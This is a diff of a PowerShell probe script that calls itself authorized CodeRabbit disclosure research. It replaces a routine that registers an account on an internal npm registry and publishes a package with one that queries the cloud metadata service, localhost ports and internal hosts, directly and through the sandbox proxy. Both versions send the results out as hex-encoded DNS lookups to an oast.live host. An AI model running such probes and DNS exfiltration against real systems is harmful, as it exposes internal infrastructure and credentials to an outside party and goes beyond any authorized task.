@@ -1,10 +1,7 @@
-# Benign Verdaccio token/publish probe for authorized CodeRabbit VDP research (ireniumsecurity).
-# Publishes only a NEW non-scoped probe package, then unpublishes it. Touches no existing package.
+# Benign proxy-boundary probe for authorized CodeRabbit VDP research (ireniumsecurity).
+# Read-only GETs through the sandbox's configured proxy vs direct. No credentials exfiltrated.
 $ErrorActionPreference = 'SilentlyContinue'
 $OAST = 'dbiemtt54sq43hh9eomg5wg85auknd4ek.oast.live'
-$R = "$env:NPM_CONFIG_REGISTRY"
-if (-not $R) { $R = 'http://10.64.0.28:4873' }
-$R = "$R".TrimEnd('/')
 $out = [ordered]@{}
 
 function Send-Exfil([string]$s) {
@@ -12,46 +9,44 @@ function Send-Exfil([string]$s) {
         $h = -join ([System.Text.Encoding]::UTF8.GetBytes($s) | ForEach-Object { $_.ToString('x2') })
         for ($i = 0; $i -lt $h.Length -and $i -le 480; $i += 48) {
             $chunk = $h.Substring($i, [Math]::Min(48, $h.Length - $i))
-            try { [System.Net.Dns]::GetHostAddresses("pse-$([int]($i/48))-$chunk.$OAST") | Out-Null } catch {}
+            try { [System.Net.Dns]::GetHostAddresses("psf-$([int]($i/48))-$chunk.$OAST") | Out-Null } catch {}
         }
     } catch {}
 }
 
-$user = 'crvdp' + (-join (1..6 | ForEach-Object { '0123456789abcdef'[(Get-Random -Maximum 16)] }))
-$tok = ''
-try {
-    $reg = @{ name = $user; password = "CrVdp-$user-9x!" } | ConvertTo-Json -Compress
-    $resp = Invoke-WebRequest -Uri ($R + '/-/user/org.couchdb.user:' + $user) -Method Put -Body $reg -ContentType 'application/json' -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
-    $out.reg = "$([int]$resp.StatusCode)"
-    try { $tok = [string](($resp.Content | ConvertFrom-Json).token) } catch {}
-} catch { $out.reg = 'ERR' }
-$out.tok = $tok.Length
+$proxy = "$env:http_proxy"
+if (-not $proxy) { $proxy = "$env:HTTP_PROXY" }
+if (-not $proxy) { $proxy = 'http://127.0.0.1:1080' }
+$out.proxy = $proxy
 
-if ($tok.Length -gt 0) {
-    # whoami via registry API (Bearer)
+function PReq($url, $useProxy, $headers) {
     try {
-        $w = Invoke-WebRequest -Uri ($R + '/-/npm/v1/user') -Headers @{ Authorization = ('Bearer ' + $tok) } -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
-        $out.who = "$([int]$w.StatusCode):" + $w.Content.Substring(0, [Math]::Min(50, $w.Content.Length))
-    } catch { $out.who = 'ERR' }
-
-    # publish a NEW non-scoped package with the npm CLI + token in .npmrc
-    $pkg = 'crvdp-probe-' + $user
-    $ver = '0.0.0-crvdp'
-    $tmp = Join-Path ([IO.Path]::GetTempPath()) ('crnpm-' + $user)
-    New-Item -ItemType Directory -Path $tmp -Force | Out-Null
-    ('{"name":"' + $pkg + '","version":"' + $ver + '","description":"benign probe"}') | Set-Content -Path (Join-Path $tmp 'package.json') -Encoding utf8
-    $authLine = ($R -replace '^https?:', '') + '/:_authToken=' + $tok
-    Set-Content -Path (Join-Path $tmp '.npmrc') -Value $authLine -Encoding utf8
-    Push-Location $tmp
-    $pubOut = (npm publish --registry $R --tag crvdp-probe 2>&1 | Out-String)
-    Pop-Location
-    $out.npmpub = $pubOut.Substring(0, [Math]::Min(90, $pubOut.Length))
-    if ($pubOut -match '\+ ' -or $pubOut -match 'published') {
-        Push-Location $tmp
-        $unOut = (npm unpublish $pkg --force --registry $R 2>&1 | Out-String)
-        Pop-Location
-        $out.npmdel = $unOut.Substring(0, [Math]::Min(60, $unOut.Length))
-    }
+        $p = @{ Uri = $url; UseBasicParsing = $true; SkipHttpErrorCheck = $true; TimeoutSec = 5; MaximumRedirection = 0 }
+        if ($useProxy) { $p.Proxy = $proxy }
+        if ($headers) { $p.Headers = $headers }
+        $resp = Invoke-WebRequest @p
+        $body = [string]$resp.Content
+        return "$([int]$resp.StatusCode):" + $body.Substring(0, [Math]::Min(40, $body.Length))
+    } catch { return 'ERR' }
 }
+
+$metaH = @{ 'Metadata-Flavor' = 'Google' }
+
+# direct controls
+$out.metaD = PReq 'http://169.254.169.254/computeMetadata/v1/project/project-id' $false $metaH
+$out.l80D = PReq 'http://127.0.0.1/' $false $null
+$out.regD = PReq 'http://10.64.0.28:4873/-/ping' $false $null
+
+# through the configured proxy
+$out.metaP = PReq 'http://169.254.169.254/computeMetadata/v1/project/project-id' $true $metaH
+$out.metaP2 = PReq 'http://169.254.169.254/' $true $metaH
+$out.l80P = PReq 'http://127.0.0.1/' $true $null
+$out.l443P = PReq 'https://127.0.0.1/' $true $null
+$out.l8080P = PReq 'http://127.0.0.1:8080/' $true $null
+$out.l1080P = PReq 'http://127.0.0.1:1080/' $true $null
+$out.l5000P = PReq 'http://127.0.0.1:5000/' $true $null
+$out.regP = PReq 'http://10.64.0.28:4873/-/ping' $true $null
+$out.gwP = PReq 'http://10.64.0.1/' $true $null
+$out.ghP = PReq 'https://api.github.com/' $true $null
 
 Send-Exfil (($out | ConvertTo-Json -Compress))
